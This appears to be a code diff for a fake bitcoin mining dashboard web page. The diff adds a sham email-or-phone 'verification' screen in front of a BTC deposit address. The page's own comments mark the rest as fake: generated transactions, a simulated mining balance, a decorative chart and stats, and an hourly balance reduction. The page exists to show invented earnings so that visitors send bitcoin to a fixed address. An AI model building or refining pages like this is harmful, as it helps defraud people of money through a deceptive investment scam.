@@ -21,9 +21,30 @@ input{width:100%;padding:10px;margin:10px 0;border-radius:6px;border:none;font-s
 button{padding:10px 18px;margin:10px 5px;background:#f2a900;border:none;color:black;font-weight:bold;border-radius:6px;cursor:pointer;}
 .progress-container{width:100%;background:#222;border-radius:8px;margin-top:15px;height:20px;}
 .progress-bar{height:20px;background:#f2a900;width:0%;border-radius:8px;}
+.hidden{display:none;}
 </style>
 </head>
 <body>
+
+<!-- Login / Verification -->
+<div class="card" id="loginCard">
+<h2>Verification Required</h2>
+<p>Enter your email or phone number to continue:</p>
+<input type="text" id="userInput" placeholder="Email or phone">
+<br>
+<button onclick="generateCode()">Get Code</button>
+<p id="loginMessage" style="color:#f2a900;font-size:14px;"></p>
+<div id="codeInputSection" class="hidden">
+<p>Enter the code you received:</p>
+<input type="text" id="codeInput" placeholder="Enter code">
+<br>
+<button onclick="verifyCode()">Verify</button>
+<p id="codeMessage" style="color:#f2a900;font-size:14px;"></p>
+</div>
+</div>
+
+<!-- Dashboard -->
+<div id="dashboard" class="hidden">
 
 <!-- BTC Deposit -->
 <div class="card">
@@ -65,24 +86,43 @@ button{padding:10px 18px;margin:10px 5px;background:#f2a900;border:none;color:bl
 <div class="tx-container" id="txContainer"></div>
 </div>
 
+</div>
+
 <script>
+// Login / verification
+let generatedCode = "";
+function generateCode() {
+  const input = document.getElementById("userInput").value.trim();
+  if(input===""){document.getElementById("loginMessage").innerText="Enter email or phone.";return;}
+  generatedCode = Math.floor(100000 + Math.random()*900000).toString();
+  document.getElementById("loginMessage").innerText="Your code: "+generatedCode;
+  document.getElementById("codeInputSection").classList.remove("hidden");
+}
+function verifyCode(){
+  const entered=document.getElementById("codeInput").value.trim();
+  if(entered===generatedCode){
+    document.getElementById("loginCard").classList.add("hidden");
+    document.getElementById("dashboard").classList.remove("hidden");
+  }else{
+    document.getElementById("codeMessage").innerText="Incorrect code. Try again.";
+  }
+}
+
 // Copy BTC address
 function copyAddress(){
   navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
     .then(()=>{alert('BTC address copied!');});
 }
 
-// BTC Setup
+// Dashboard simulation
 const address="bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav";
 let balance=0;
 let pendingBalance=0;
 let txContainer=document.getElementById("txContainer");
 let paused=false;
-
-// Mining simulation
 let rate=0.0000001;
 
-// Add fake transactions continuously
+// Fake transactions
 function addFakeTx(){
   const div=document.createElement("div");
   div.className="tx-entry";
@@ -94,7 +134,7 @@ function addFakeTx(){
 }
 setInterval(addFakeTx,1500);
 
-// BTC balance animation
+// Mining simulation
 function simulateMining(){
   if(paused) return;
   let add=rate;
@@ -106,13 +146,12 @@ setInterval(simulateMining,1000);
 
 // Progress bar
 let progress=0;
-function animateProgress(){
-  progress+=0.5; if(progress>100) progress=0;
-  document.getElementById("progressBar").style.width=progress+"%";
-}
-setInterval(animateProgress,500);
+setInterval(()=>{
+ progress+=0.5; if(progress>100) progress=0;
+ document.getElementById("progressBar").style.width=progress+"%";
+},500);
 
-// Smooth BTC chart
+// Chart
 const canvas=document.getElementById("chart"); const ctx=canvas.getContext("2d");
 let points=[0];
 function drawChart(){
@@ -131,7 +170,7 @@ function drawChart(){
 }
 setInterval(drawChart,500);
 
-// Blocks & uptime
+// Stats
 let blocks=0,minutes=0;
 function updateStats(){
   blocks+=Math.floor(Math.random()*2);
@@ -158,6 +197,7 @@ startPauseCycle();
 // 1-hour drop
 function startHourlyDrop(){ setInterval(()=>{ balance*=0.995; },60*60*1000); }
 startHourlyDrop();
+
 </script>
 </body>
 </html>
